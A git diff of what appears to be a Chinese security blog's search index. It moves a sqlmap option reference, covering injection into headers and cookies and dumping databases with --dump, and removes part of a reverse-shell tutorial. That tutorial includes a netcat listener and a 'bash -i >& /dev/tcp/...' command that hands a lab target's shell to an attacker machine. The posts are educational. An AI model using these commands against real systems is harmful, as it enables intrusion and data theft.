@@ -567,6 +567,100 @@
       </tags>
   </entry>
   <entry>
+    <title>SQLmap 常用命令</title>
+    <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
+<p>sqlmap支持五种不同的注入模式：</p>
+<ol>
+<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>联合查询注入，可以使用union的情况下的注入。</li>
+<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ol>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul>
+<li>首先是sql自带的帮助文档</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -hh</span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
+<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
+<h3 id="目标选定"><a href="#目标选定" class="headerlink" title="目标选定"></a>目标选定</h3><h4 id="直接连接到数据库"><a href="#直接连接到数据库" class="headerlink" title="直接连接到数据库"></a>直接连接到数据库</h4><p>参数：-d</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql:&#x2F;&#x2F;admin:admin@127.0.0.1:3306&#x2F;db&quot;</span><br></pre></td></tr></table></figure>
+<p>对单个数据库运行sqkmap</p>
+<h4 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h4><p>参数：-u 或者 –url</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="HTTP数据"><a href="#HTTP数据" class="headerlink" title="HTTP数据"></a>HTTP数据</h4><p>参数：–data</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; --data&#x3D;&quot;id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
+<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p>
+<h4 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h4><p>参数：–cookie,–load-cookies,–drop-set-cookie</p>
+<p>这个参数在以下两个方面很有用：</p>
+<ol>
+<li><p>web应用需要登陆的时候。</p>
+</li>
+<li><p>你想要在这些头参数中测试SQL注入时。</p>
+</li>
+</ol>
+<p>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。</p>
+<p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p>
+<p>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。</p>
+<p>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
+<h4 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h4><p>参数：–user-agent,–random-agent</p>
+<p>用于指定 user-agent ，当使用 –random-agent 时，sqlmap会从./txt/user-agents.txt获取参数。</p>
+<p>当–level的参数设定为3或者3以上的时候，sqlmap会尝试注入User-Agent参数。</p>
+<h4 id="HTTP-Host头"><a href="#HTTP-Host头" class="headerlink" title="HTTP Host头"></a>HTTP Host头</h4><p>参数：–host</p>
+<p>用于指定 host 的值。</p>
+<h4 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h4><p>参数：–referer</p>
+<p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。</p>
+<h4 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h4><p>参数：–headers</p>
+<p>可以通过–headers参数来增加额外的http头。</p>
+<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><h4 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="指定数据库类型"></a>指定数据库类型</h4><p>参数：–dbms</p>
+<p>默认sqlmap会自动探测web应用后端的数据库是什么</p>
+<h4 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h4><p>参数：–risk</p>
+<p>设置测试用例的类型,默认是1, 会使用常见的注入用例,2:加入基于时间的盲注, 3: 增加基于OR的测试用例，在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
+<h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><h4 id="注入所使用的类型"><a href="#注入所使用的类型" class="headerlink" title="注入所使用的类型"></a>注入所使用的类型</h4><p>参数：–technique</p>
+<ul>
+<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
+<li>E: Error-based SQL injection（报错型注入）</li>
+<li>U: UNION query SQL injection（可联合查询注入）</li>
+<li>S: Stacked queries SQL injection（可多语句查询注入）</li>
+<li>T: Time-based blind SQL injection（基于时间延迟注入）</li>
+</ul>
+<h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><h4 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h4><p>参数：–dbs</p>
+<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
+<h4 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h4><p>参数：–tables</p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
+<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
+<h4 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h4><p>参数：–columns</p>
+<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
+<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
+<h4 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h4><p>参数：–count</p>
+<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
+<h4 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h4><p>参数：–dump</p>
+<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取这个表的所有内容。</p>
+<p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
+<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><h4 id="清除session"><a href="#清除session" class="headerlink" title="清除session"></a>清除session</h4><p>参数：–flush-session</p>
+<p>会清空当前URL相关的session</p>
+<h4 id="清除查询结果"><a href="#清除查询结果" class="headerlink" title="清除查询结果"></a>清除查询结果</h4><p>参数：–fresh-queries</p>
+<p>清除之前的查询结果,进行重新请求操作。</p>
+<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><h4 id="初级用户向导"><a href="#初级用户向导" class="headerlink" title="初级用户向导"></a>初级用户向导</h4><p>参数：–wizard</p>
+<p>面向初级用户的参数，可以一步一步交互式操作</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS 挑战赛</title>
     <url>/2021/03/10/XSS%E6%8C%91%E6%88%98%E8%B5%9B/</url>
     <content><![CDATA[<h1 id="XSS-挑战赛"><a href="#XSS-挑战赛" class="headerlink" title="XSS 挑战赛"></a>XSS 挑战赛</h1><p>地址：<a class="link"   href="http://test.ctf8.com/" >http://test.ctf8.com/<i class="fas fa-external-link-alt"></i></a></p>
@@ -706,100 +800,6 @@
       </categories>
       <tags>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQLmap 常用命令</title>
-    <url>/2021/03/07/SQLmap%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p>这里是一些我自己用过的或者感觉上回比较实用的一些sqlmap参数命令，有新的会不断补充</p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
-<p>sqlmap支持五种不同的注入模式：</p>
-<ol>
-<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
-<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
-<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
-<li>联合查询注入，可以使用union的情况下的注入。</li>
-<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
-</ol>
-<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><ul>
-<li>首先是sql自带的帮助文档</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -hh</span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>
-<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
-<h3 id="目标选定"><a href="#目标选定" class="headerlink" title="目标选定"></a>目标选定</h3><h4 id="直接连接到数据库"><a href="#直接连接到数据库" class="headerlink" title="直接连接到数据库"></a>直接连接到数据库</h4><p>参数：-d</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql:&#x2F;&#x2F;admin:admin@127.0.0.1:3306&#x2F;db&quot;</span><br></pre></td></tr></table></figure>
-<p>对单个数据库运行sqkmap</p>
-<h4 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h4><p>参数：-u 或者 –url</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="HTTP数据"><a href="#HTTP数据" class="headerlink" title="HTTP数据"></a>HTTP数据</h4><p>参数：–data</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http(s):&#x2F;&#x2F;targeturl:[port]&#x2F;[...]&quot; --data&#x3D;&quot;id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
-<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数</p>
-<h4 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h4><p>参数：–cookie,–load-cookies,–drop-set-cookie</p>
-<p>这个参数在以下两个方面很有用：</p>
-<ol>
-<li><p>web应用需要登陆的时候。</p>
-</li>
-<li><p>你想要在这些头参数中测试SQL注入时。</p>
-</li>
-</ol>
-<p>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。</p>
-<p>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。</p>
-<p>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。</p>
-<p>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p>
-<h4 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h4><p>参数：–user-agent,–random-agent</p>
-<p>用于指定 user-agent ，当使用 –random-agent 时，sqlmap会从./txt/user-agents.txt获取参数。</p>
-<p>当–level的参数设定为3或者3以上的时候，sqlmap会尝试注入User-Agent参数。</p>
-<h4 id="HTTP-Host头"><a href="#HTTP-Host头" class="headerlink" title="HTTP Host头"></a>HTTP Host头</h4><p>参数：–host</p>
-<p>用于指定 host 的值。</p>
-<h4 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h4><p>参数：–referer</p>
-<p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。</p>
-<h4 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h4><p>参数：–headers</p>
-<p>可以通过–headers参数来增加额外的http头。</p>
-<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><h4 id="指定数据库类型"><a href="#指定数据库类型" class="headerlink" title="指定数据库类型"></a>指定数据库类型</h4><p>参数：–dbms</p>
-<p>默认sqlmap会自动探测web应用后端的数据库是什么</p>
-<h4 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h4><p>参数：–risk</p>
-<p>设置测试用例的类型,默认是1, 会使用常见的注入用例,2:加入基于时间的盲注, 3: 增加基于OR的测试用例，在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
-<h3 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h3><h4 id="注入所使用的类型"><a href="#注入所使用的类型" class="headerlink" title="注入所使用的类型"></a>注入所使用的类型</h4><p>参数：–technique</p>
-<ul>
-<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
-<li>E: Error-based SQL injection（报错型注入）</li>
-<li>U: UNION query SQL injection（可联合查询注入）</li>
-<li>S: Stacked queries SQL injection（可多语句查询注入）</li>
-<li>T: Time-based blind SQL injection（基于时间延迟注入）</li>
-</ul>
-<h3 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h3><h4 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h4><p>参数：–dbs</p>
-<p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p>
-<h4 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h4><p>参数：–tables</p>
-<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</p>
-<p>如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p>
-<h4 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h4><p>参数：–columns</p>
-<p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p>
-<p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p>
-<h4 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h4><p>参数：–count</p>
-<p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p>
-<h4 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h4><p>参数：–dump</p>
-<p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取这个表的所有内容。</p>
-<p>使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。</p>
-<h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><h4 id="清除session"><a href="#清除session" class="headerlink" title="清除session"></a>清除session</h4><p>参数：–flush-session</p>
-<p>会清空当前URL相关的session</p>
-<h4 id="清除查询结果"><a href="#清除查询结果" class="headerlink" title="清除查询结果"></a>清除查询结果</h4><p>参数：–fresh-queries</p>
-<p>清除之前的查询结果,进行重新请求操作。</p>
-<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><h4 id="初级用户向导"><a href="#初级用户向导" class="headerlink" title="初级用户向导"></a>初级用户向导</h4><p>参数：–wizard</p>
-<p>面向初级用户的参数，可以一步一步交互式操作</p>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -990,224 +990,6 @@
       </categories>
       <tags>
         <tag>同源策略</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反弹shell</title>
-    <url>/2021/03/29/%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
-<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
-<ol>
-<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
-</li>
-<li><p>它的ip会动态改变，你不能持续控制。</p>
-</li>
-<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
-</li>
-<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
-</li>
-</ol>
-<p>这些情况都可以通过反弹shell来解决。</p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
-<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
-<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
-</blockquote>
-<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
-<table>
-<thead>
-<tr>
-<th>描述符</th>
-<th>用途</th>
-<th>stdio流</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>标准输入</td>
-<td>stdin</td>
-</tr>
-<tr>
-<td>1</td>
-<td>标准输出</td>
-<td>stdout</td>
-</tr>
-<tr>
-<td>2</td>
-<td>标准错误</td>
-<td>stderr</td>
-</tr>
-</tbody></table>
-<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
-<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
-<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
-<ol>
-<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
-<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
-</ol>
-<p><strong>重点</strong>：</p>
-<ol>
-<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
-</li>
-<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
-</li>
-<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
-</li>
-<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
-</li>
-</ol>
-<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
-<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
-<p>example:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
-<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
-<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
-<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
-<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
-<p>说明：</p>
-<ol>
-<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
-</li>
-<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
-</li>
-</ol>
-<p><strong>重点：</strong></p>
-<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
-<ul>
-<li>cmd &gt; file 2&gt;&amp;1</li>
-</ul>
-<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
-<ul>
-<li>cmd 2&gt;&amp;1 &gt;file</li>
-</ul>
-<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
-<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
-<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
-<p><strong>重点：</strong></p>
-<p>格式： </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
-<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
-<p>example：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
-<p>实验环境：</p>
-<ul>
-<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
-</li>
-<li><p>攻击机（Kali）IP：192.168.91.128</p>
-</li>
-</ul>
-<p>首先在攻击机上开启监听端口：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
-<p>然后再靶机上执行：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>然后就可以看到攻击机控制了靶机的shell</p>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
-<p>命令解释：</p>
-<ul>
-<li><p><strong>bash -i</strong></p>
-<ol>
-<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
-</li>
